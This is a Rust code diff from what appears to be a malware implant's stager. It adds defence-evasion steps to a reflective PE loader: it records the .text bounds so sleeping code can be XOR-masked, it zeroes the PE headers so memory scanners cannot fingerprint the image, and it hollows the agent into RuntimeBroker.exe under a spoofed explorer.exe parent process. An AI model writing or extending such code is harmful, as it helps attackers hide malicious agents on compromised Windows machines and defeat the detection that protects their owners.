@@ -207,6 +207,13 @@ unsafe fn set_section_permissions(new_base: *mut u8, sections: &[Section]) {
     }
 }
 
+// ── .text bounds — set by reflect_pe, read by masked_sleep for Step 5 ────────
+
+#[cfg(all(target_os = "windows", feature = "udrl"))]
+pub static TEXT_BASE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+#[cfg(all(target_os = "windows", feature = "udrl"))]
+pub static TEXT_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+
 // ── UDRL entry point ──────────────────────────────────────────────────────────
 
 /// Map a PE image into the current process without using the Windows loader.
@@ -275,6 +282,37 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
     // Per-section memory permissions
     set_section_permissions(new_base, &info.sections);
 
+    // Step 5: record .text section bounds so masked_sleep can XOR it during sleep.
+    // Step 3: stomp PE headers AFTER section perms are set (headers stay RW at this point
+    //         since no section covers the header range).
+    {
+        use core::sync::atomic::Ordering;
+        use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_READWRITE, PAGE_READONLY};
+
+        // Find and record the .text section.
+        let sh_base = {
+            let fh = (u32::from_le_bytes([pe[0x3C],pe[0x3D],pe[0x3E],pe[0x3F]]) as usize) + 4;
+            let opt_sz = u16::from_le_bytes([pe[fh+16],pe[fh+17]]) as usize;
+            fh + 20 + opt_sz
+        };
+        for i in 0..info.sections.len() {
+            let s = sh_base + i * 40;
+            if pe.len() >= s + 8 && pe[s..s+5] == *b".text" {
+                TEXT_BASE.store(new_base as u64 + info.sections[i].virtual_address as u64, Ordering::Relaxed);
+                TEXT_SIZE.store(info.sections[i].virtual_size as u64, Ordering::Relaxed);
+                break;
+            }
+        }
+
+        // Step 3: zero the MZ/PE header region so memory scanners can't fingerprint the image.
+        let stomp_size = (info.size_of_headers as usize).min(0x1000);
+        let mut old_prot: u32 = 0;
+        if VirtualProtect(new_base as _, stomp_size, PAGE_READWRITE, &mut old_prot) != 0 {
+            core::ptr::write_bytes(new_base, 0u8, stomp_size);
+            VirtualProtect(new_base as _, stomp_size, PAGE_READONLY, &mut old_prot);
+        }
+    }
+
     Ok(new_base.add(info.entry_point_rva as usize))
 }
 
@@ -304,6 +342,37 @@ pub fn do_staged_load() -> ! {
         }
     };
 
+    // Step 6: when process-hollow and ppid-spoof features are both active,
+    // hollow the full agent into RuntimeBroker.exe (spoofed under explorer.exe)
+    // so all future child processes appear to come from a legitimate parent.
+    // The stager then exits cleanly; the agent runs inside the hollowed process.
+    #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
+    {
+        let explorer_pid = crate::inject::pid_by_name("explorer.exe");
+        let target = "C:\\Windows\\System32\\RuntimeBroker.exe";
+        let spoofed = explorer_pid.and_then(|ppid| {
+            crate::inject::spawn_suspended_spoofed(target, ppid)
+        });
+        let hollow_ok = if let Some((proc, thread)) = spoofed {
+            let ok = crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok();
+            if !ok {
+                // If hollow failed the process is abandoned — it was suspended and
+                // will be cleaned up by the OS when our stager exits.
+            }
+            ok
+        } else {
+            false
+        };
+        if hollow_ok {
+            std::process::exit(0);
+        }
+        // Fallback: hollow without PPID spoof if the spoofed spawn failed.
+        if crate::inject::inject_hollow(target, &pe_bytes).is_ok() {
+            std::process::exit(0);
+        }
+    }
+
+    // Non-hollow path: reflect the agent PE into the stager's own address space.
     let entry = unsafe {
         match reflect_pe(&pe_bytes) {
             Ok(ep) => ep,
